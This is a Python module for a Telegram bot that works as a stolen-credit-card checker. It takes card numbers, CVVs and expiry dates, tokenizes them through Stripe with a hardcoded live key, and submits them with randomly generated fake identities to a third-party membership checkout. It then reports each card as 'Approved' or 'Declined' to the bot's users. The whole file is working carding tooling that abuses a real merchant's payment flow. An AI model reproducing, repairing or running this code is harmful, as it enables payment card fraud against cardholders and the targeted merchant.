from main import bot
import logging
import os
import requests
import json
from rand_user import random_user_api
import time
import string
import random
from defs import *
from main import bot
from time import sleep
import random
from bs4 import BeautifulSoup
session = requests.session()
#N = 10
#rnd = ''.join(random.choices(string.ascii_lowercase +
                              #  string.digits, k = N))
BLACKLISTED = [400189]
@bot.message_handler(commands=['sc'])
async def zc(message):
	file = open('groups.txt', 'r') 
	if str(message.chat.id) + "\n" not in file.readlines():
		await bot.reply_to(message,'Chat id Not Authorized')
	#elif str(message.from_user.id) + "\n" not in file.readlines():
		#await bot.reply_to(message,'You are not authorized')
	else:
         tic = time.perf_counter()
         cc = message.text[len('/zc '):]
         splitter = cc.split('|')
         ccn = splitter[0]
         mm = splitter[1]
         yy = splitter[2]
         cvv = splitter[3]
         email = f"anirbajhaihsojhek@gmail.com"
         if not cc:
             return await bot.reply_to(
                 "<code>Send Card /chk cc|mm|yy|cvv.</code>"
             )   
         BIN = cc[:6]
         if BIN in BLACKLISTED:
             return await bot.reply_to(
                 "<b>BLACKLISTED BIN</b>"
                )
    # get guid muid sid
#    headers = {
#        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
#        "Accept": "application/json, text/plain, */*",
#        "Content-Type": "application/x-www-form-urlencoded"
#    }
 #   s = session.post("https://m.stripe.com/6",
#                     headers=headers)
#    r = s.json()
#    Guid = r["guid"]
#    Muid = r["muid"]
    #Sid = r["sid"]
    
    # now 1 req
         head = {
          'authority': 'api.stripe.com',
          'method': 'POST',
          'path': '/v1/payment_pages',
          'scheme': 'https',
          'accept': 'application/json',
          'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
          'content-length': '507',
          'content-type': 'application/x-www-form-urlencoded',
          'dnt': '1',
          'origin': 'https://js.stripe.com',
          'referer': 'https://js.stripe.com/',
          'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-fetch-dest': 'empty',
          'sec-fetch-mode': 'cors',
          'sec-fetch-site': 'same-site',
          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',}
    
         payload = {
           'type': 'card',
           'card[number]': ccn,
           'card[cvc]': cvv,
           'card[exp_month]': mm,
           'card[exp_year]': yy,
           'pasted_fields': 'number',
           'payment_user_agent': 'stripe.js/24a63753f; stripe-js-v3/24a63753f',
           'key': 'pk_live_Xq2eThi80NhL5srZxbMAnrVr00PcTyZBqp',}
           
    
         rx = session.post("https://api.stripe.com/v1/payment_methods",
                           data=payload)
         res = rx.text
         token = find_between(res,'"id": "','"')
         mess = await bot.reply_to(message,"Checking wait 1 req")
         random_user = random_user_api().get_random_user_info()
         payloads = {
            'level': '1',
            'checkjavascript': '1',
            'other_discount_code': '',
            'username': random_user.username,
            'password': random_user.password,
            'password2': random_user.password,
            'first_name': random_user.first_name,
            'last_name': random_user.last_name,
            'bemail': random_user.email,
            'bconfirmemail': random_user.email,
            'member_business': random_user.name,
            'member_title': 'Owner',
            'stage_of_company': 'Startup',
            'years_of_operation': '1',
            'industry': 'Accommodation and Food Services',
            'zipcode': random_user.postcode,
            'fullname': '',
            'bcountry': 'US',
            'bfirstname': random_user.first_name,
            'blastname': random_user.last_name,
            'baddress1': random_user.street,
            'baddress2': '',
            'bcity': random_user.city,
            'bstate': random_user.state,
            'bzipcode': random_user.postcode,
            'bphone': random_user.phone,
            'CardType': 'MC',
            'discount_code': '',
            'tos': '1',
            'submit-checkout': '1',
            'javascriptok': '1',
            'payment_method_id': token,
            'AccountNumber': cc,
            'ExpirationMonth': mm,
            'ExpirationYear': yy,
         }
         edit1 = await bot.edit_message_text("Under Proccesing.. ",message.chat.id,mess.id,parse_mode="HTML")
         sleep(3)
         edit2 = await bot.edit_message_text("Under Proccesing.. 60%",message.chat.id,edit1.id,parse_mode="HTML")
         sleep(3)
         two = requests.post('https://ascenum.com/membership-checkout/?level=1', data = payloads)
         
         threee = two.text
         msg =  find_between(threee,'pmpro_message pmpro_error">Error updating default payment method. ','</')
         toc = time.perf_counter()
         if "incorrecti_cvc" in two.text:
               await bot.edit_message_text(f"""
 ✅<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         elif "Unrecognized request URL" in two.text:
             await bot.edit_message_text("[UPDATE] PROXIES ERROR")
    #elif rx.status_code == 200:
      #  await bot.reply_to(message,"""
#✔️<b>CC</b>➟ <code>{cc}</code>
#<b>STATUS</b>➟ 
#<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
#<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
#""")
         elif "Your card’s security code is incorrect" in msg:
         	await bot.edit_message_text(f"""
<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Approved ✅
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         elif "Error updating default payment method. Your card was declined" in two.text:
         	await bot.edit_message_text(f"""
💔<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Refused
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
         else:
             await bot.edit_message_text(f"""
<b>CC</b>➟ <code>{cc}</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {msg}
<b>TOOK:</b> <code>{toc - tic:0.4f}</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
""",message.chat.id, edit2.id,parse_mode="HTML")
